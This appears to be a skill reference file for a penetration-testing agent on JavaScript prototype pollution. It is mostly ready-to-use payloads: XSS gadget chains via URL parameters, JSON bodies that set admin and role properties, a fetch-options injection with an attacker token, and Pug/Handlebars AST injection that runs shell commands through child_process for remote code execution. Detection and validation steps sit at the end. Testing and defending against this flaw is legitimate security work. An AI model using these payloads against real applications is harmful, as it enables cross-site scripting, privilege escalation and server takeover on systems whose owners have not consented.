---
name: prototype_pollution
description: Prototype pollution - client-side and server-side, gadget chains, XSS escalation, AST injection, JSON merge exploitation
---

# Prototype Pollution

Prototype pollution occurs when attacker-controlled data merges into JavaScript objects recursively without sanitization, setting properties on `Object.prototype`. Every subsequent object inherits these polluted properties — enabling XSS via gadgets, auth bypass via truthy property injection, RCE in Node.js via AST injection, and DoS.

## Attack Surface

**Client-Side Entry Points**
- URL query parameters parsed into objects: `?__proto__[x]=1`
- Hash/fragment parsed as key-value: `#constructor.prototype.x=1`
- JSON in POST body merged into config objects
- `jQuery.extend()`, `lodash.merge()`, `_.defaultsDeep()` with user data
- localStorage / sessionStorage values merged into app state

**Server-Side Entry Points (Node.js)**
- JSON body → `_.merge()`, `deepmerge()`, `recursive-merge` without sanitization
- YAML deserialization (`js-yaml` anchors)
- MongoDB query operators in deep-merged query objects
- Template engines receiving merged configuration

## Client-Side Exploitation

### URL Parameter Injection

```
# Test for pollution via URL
https://example.com/?__proto__[testPP]=polluted
https://example.com/?constructor[prototype][testPP]=polluted
https://example.com/#__proto__[testPP]=polluted

# Check in console:
Object.prototype.testPP  // "polluted" = vulnerable
```

### Common Gadget Chains (for XSS)

```javascript
// Gadget 1: transport_url (used by some analytics libs)
?__proto__[transport_url]=data:,alert(1)//

// Gadget 2: innerHTML assignment gadgets
?__proto__[innerHTML]=<img src onerror=alert(document.domain)>

// Gadget 3: jQuery html() gadget in old apps
?__proto__[html]=<img src onerror=alert(1)>

// Gadget 4: eval-based gadgets in Handlebars
?__proto__[helperMissing][]=function(){}
?__proto__[helperMissing][]=alert
?__proto__[helperMissing][0]=alert

// Gadget 5: Template string injection
?__proto__[template]=${alert(1)}

// Gadget 6: Options object pollution for fetch()
?__proto__[credentials]=include
?__proto__[headers][Authorization]=attacker-token
```

### DOM Clobbering + Prototype Pollution Chain

```html
<!-- Step 1: Clobber a property via DOM -->
<form id="__proto__"><input name="isAdmin" value="true"></form>
<!-- Step 2: Combine with prototype pollution to escalate -->
```

### Base64 + Hash Pollution

```javascript
// Some apps parse hash with JSON.parse after decoding:
https://example.com/#eyJfX3Byb3RvX18iOnsicG9sbHV0ZWQiOiJ0cnVlIn19
// decoded: {"__proto__":{"polluted":"true"}}
```

## Server-Side Exploitation (Node.js)

### JSON Merge Pollution

```json
POST /api/settings HTTP/1.1
Content-Type: application/json

{
  "__proto__": {
    "polluted": "true"
  }
}
```

If backend uses `merge(target, body)` without key sanitization, `Object.prototype.polluted` becomes `"true"` for all objects.

```json
{
  "constructor": {
    "prototype": {
      "isAdmin": true,
      "role": "admin"
    }
  }
}
```

### AST Injection (Pug/Jade Template RCE)

When `opts.polluted` reaches template engine AST parsing:

```json
{
  "__proto__": {
    "type": "Program",
    "body": [{
      "type": "MustacheStatement",
      "path": {"type": "PathExpression", "original": "process.mainModule.require('child_process').execSync('id')"}
    }]
  }
}
```

Pug-specific (Node.js RCE):

```json
{
  "__proto__": {
    "block": {
      "type": "Text",
      "line": "process.mainModule.require('child_process').execSync('id > /tmp/rce')"
    }
  }
}
```

### Status Code Override

```json
{
  "__proto__": {
    "status": 200
  }
}
```

If responses check `if (!obj.status)` and 403 gets overridden to 200 via inherited property.

## YAML Anchor Pollution

Using js-yaml without safe load:

```yaml
payload: &id001 {a: 1}
__proto__: *id001
# Results in Object.prototype.a = 1
```

## Detection Script

```javascript
// Client-side test — run in browser console after injecting ?__proto__[pp_test]=1
console.log(Object.prototype.pp_test); // Should be undefined on clean target

// Server-side — send and check if ordinary {} objects gain the property
fetch('/api/endpoint', {
  method: 'POST',
  body: JSON.stringify({"__proto__": {"testPP": "confirmed"}}),
  headers: {'Content-Type': 'application/json'}
}).then(async r => {
  console.log(await r.text());
  // Also: fetch('/api/any-endpoint') and check response behavior
});
```

### Automated Detection

```bash
# Client-side with DOM Invader (Burp)
# Server-side with:
npx @nicolo-ribaudo/pp-test --url https://example.com/api/endpoint
```

## Validation Approach

1. Inject `?__proto__[testPP]=polluted` in URL and check `Object.prototype.testPP` in console
2. Try POST with `{"__proto__":{"polluted":true}}` body — observe if behavior changes
3. For gadget XSS: construct full PoC showing alert/data exfil
4. For auth bypass: show `isAdmin: true` property causes privilege escalation
5. Document: payload type → endpoint → proxy request ID → evidence of pollution effect

## Tools

- `ppfuzz` — automated client-side prototype pollution fuzzer
- Burp DOM Invader — detects client-side gadgets
- `server-side-prototype-pollution` Burp extension
- Manual `send_request` with `__proto__` key in JSON body
